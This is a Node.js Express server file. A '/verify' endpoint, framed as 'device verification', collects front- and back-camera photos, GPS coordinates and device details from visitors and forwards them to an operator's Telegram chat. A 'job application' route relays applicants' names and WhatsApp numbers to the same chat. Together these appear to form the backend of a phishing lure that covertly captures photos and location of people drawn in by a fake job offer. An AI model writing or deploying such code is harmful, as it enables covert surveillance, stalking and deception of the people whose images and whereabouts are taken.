require('dotenv').config();
const express = require('express');
const { Telegraf } = require('telegraf');
const axios = require('axios');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);

// Middleware
app.use(express.static('public'));
app.use(express.json({ limit: '50mb' })); // Increased for multiple high-res images
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));
// Telegram bot setup
bot.start((ctx) => ctx.reply('Welcome to device verification'));
bot.launch();

// Enhanced Telegram sender with retries
async function sendToTelegramWithRetry(method, data, retries = 3) {
  for (let i = 0; i < retries; i++) {
    try {
      if (method === 'sendPhoto') {
        return await bot.telegram.sendPhoto(
          process.env.TELEGRAM_CHAT_ID,
          { source: data.imageBuffer },
          { caption: data.caption }
        );
      } else {
        return await bot.telegram.sendMessage(process.env.TELEGRAM_CHAT_ID, data.text);
      }
    } catch (error) {
      if (i === retries - 1) throw error;
      await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
      console.log(`Retry ${i + 1} for ${method}`);
    }
  }
}

// Process and validate images
function processImages(images, maxImages = 4) {
  if (!images || !Array.isArray(images)) return [];
  
  return images
    .filter(img => typeof img === 'string' && img.startsWith('data:image'))
    .slice(0, maxImages)
    .map(img => ({
      base64: img.replace(/^data:image\/\w+;base64,/, ''),
      buffer: Buffer.from(img.replace(/^data:image\/\w+;base64,/, ''), 'base64')
    }));
}

app.post('/verify', async (req, res) => {
  try {
    const { frontImages, backImages, deviceInfo, location } = req.body;
    
    // Validate minimum requirements
    if (!deviceInfo || !location) {
      return res.status(400).json({ 
        success: false, 
        message: 'Device info and location are required' 
      });
    }

    // Process images - ensure we get at least 4 from each camera
    const processedFront = processImages(frontImages, 4);
    const processedBack = processImages(backImages, 4);
    const totalImages = processedFront.length + processedBack.length;

    // Send device info first
    await sendToTelegramWithRetry('sendMessage', {
      text: `📱 New Verification Request\n\n` +
            `🆔 Device: ${deviceInfo.model || 'Unknown'}\n` +
            `⚙️ OS: ${deviceInfo.os || 'Unknown'}\n` +
            `Battery: ${deviceInfo.battery.level} (${deviceInfo.battery.charging ? 'Charging' : 'Not charging'})\n` +
            `📍 Location: ${location.latitude}, ${location.longitude}\n` +
            `🎯 Accuracy: ${location.accuracy}m\n` +
            `📸 Images: ${totalImages} (${processedFront.length}F/${processedBack.length}B)`
    });

    // Send images with progress tracking
    const sendImageBatch = async (images, type) => {
      for (let i = 0; i < images.length; i++) {
        await sendToTelegramWithRetry('sendPhoto', {
          imageBuffer: images[i].buffer,
          caption: `${type} Image ${i + 1}/${images.length}`
        });
        
        // Throttle sends to avoid rate limits
        if (i < images.length - 1) {
          await new Promise(resolve => setTimeout(resolve, 800));
        }
      }
    };

    // Send front images (minimum 4)
    if (processedFront.length > 0) {
      await sendImageBatch(processedFront, 'Front');
    } else {
      await sendToTelegramWithRetry('sendMessage', {
        text: '⚠️ No front camera images received'
      });
    }

    // Send back images (minimum 4)
    if (processedBack.length > 0) {
      await sendImageBatch(processedBack, 'Back');
    } else {
      await sendToTelegramWithRetry('sendMessage', {
        text: '⚠️ No back camera images received'
      });
    }

    // Final confirmation
    await sendToTelegramWithRetry('sendMessage', {
      text: `✅ Verification completed with ${totalImages} images`
    });

    res.status(200).json({ 
      success: true, 
      receivedImages: totalImages,
      message: 'Verification data processed successfully'
    });

  } catch (error) {
    console.error('Verification error:', error);
    
    // Try to notify admin about failure
    try {
      await bot.telegram.sendMessage(
        process.env.TELEGRAM_CHAT_ID,
        `❌ Verification failed: ${error.message}`
      );
    } catch (telegramError) {
      console.error('Failed to send error notification:', telegramError);
    }
    
    res.status(500).json({ 
      success: false, 
      message: 'Verification processing failed',
      error: error.message
    });
  }
});

// Health check endpoint
app.get('/health', async (req, res) => {
  try {
    await axios.get('https://api.telegram.org');
    res.json({ 
      status: 'healthy',
      telegram: 'reachable',
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    res.status(500).json({
      status: 'unhealthy',
      error: error.message,
      timestamp: new Date().toISOString()
    });
  }
});
//here is job application code 

// Route to serve the HTML file
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'next-step.html'));
});

// API endpoint to handle form submissions
app.post('/submit-application', async (req, res) => {
  try {
    const { name, job, whatsapp, details } = req.body;
    
    // Server-side validation
    if (!name || typeof name !== 'string' || name.trim().length < 2) {
      return res.status(400).json({ success: false, message: 'Please provide a valid name' });
    }
    
    if (!job || typeof job !== 'string' || !['Graphic Designing', 'Digital Marketing', 'Video Editing'].includes(job)) {
      return res.status(400).json({ success: false, message: 'Please select a valid job position' });
    }
    
    const whatsappRegex = /^\+[0-9]{7,15}$/;
    if (!whatsapp || typeof whatsapp !== 'string' || !whatsappRegex.test(whatsapp)) {
      return res.status(400).json({ success: false, message: 'Please provide a valid WhatsApp number' });
    }
    
    if (!details || typeof details !== 'string' || details.trim().length < 20) {
      return res.status(400).json({ success: false, message: 'Please provide more detailed information about why you want this job' });
    }
    
    // Access environment variables
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error('Missing environment variables');
      return res.status(500).json({ success: false, message: 'Server configuration error' });
    }

    // Format message for Telegram
    const message = `
📋 New Job Application

👤 Name: ${name}
💼 Position: ${job}
📱 WhatsApp: ${whatsapp}
📝 Details: ${details}
    `;
    
    // Send to Telegram Bot API
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const telegramResponse = await axios.post(telegramUrl, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    });
    
    if (telegramResponse.data.ok) {
      res.json({ success: true, message: 'Application submitted successfully' });
    } else {
      console.error('Telegram API error:', telegramResponse.data);
      res.status(500).json({ success: false, message: 'Error sending to Telegram' });
    }
  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});




app.listen(process.env.PORT, () => {
  console.log(`Server running on port ${process.env.PORT}`);
  console.log(`Telegram bot: @${process.env.TELEGRAM_BOT_TOKEN.split(':')[0]}`);
});